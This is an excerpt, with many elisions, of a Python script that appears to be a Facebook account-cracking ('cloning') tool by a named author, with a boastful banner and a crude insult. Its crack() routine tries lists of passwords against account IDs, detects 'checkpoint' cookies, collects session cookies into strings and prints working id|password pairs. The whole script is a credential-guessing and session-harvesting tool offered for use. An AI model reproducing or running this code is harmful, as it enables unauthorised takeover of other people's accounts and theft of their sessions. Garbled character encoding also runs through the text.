...
#Chnge Name 
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;97mAMIR-GURUNG]')
...
def banner():
	...
	ban=''' Â© NEPAL
      ___         _    
  / _ | __ _  (_)___ AUTHOR AMIR-GURUNG
 / __ |/  ' \/ / __/ FB-ID Amir Gurung
/_/ |_/_/_/_/_/_/    JUST FEEL THE POWERðŸ¥ºâ¤ï¸                                      '''
...
def passwrd():
	...
	print(f'                    {m}A {k}M {h}R {u}I {b}R {u}  â˜…  {b}G {u}U {h} R{k} U{m} N{b} G{b}')
	print('')
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}=>{k} MUJI KASTO VAYO TA CLONING{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}AMIR-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     âœ¨ GURUNG-CHECKPOINT âœ¨ [red]'))
				...
				cetak(nel('[green]      â¤ï¸âœ¨ AMIR-OK â¤ï¸âœ¨[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      ðŸ˜­GURUNG-IS-HEREðŸ¤£[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='GURUNG-CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='AMIR-OK'))
					ok+=1
					break
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> GURUNG       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
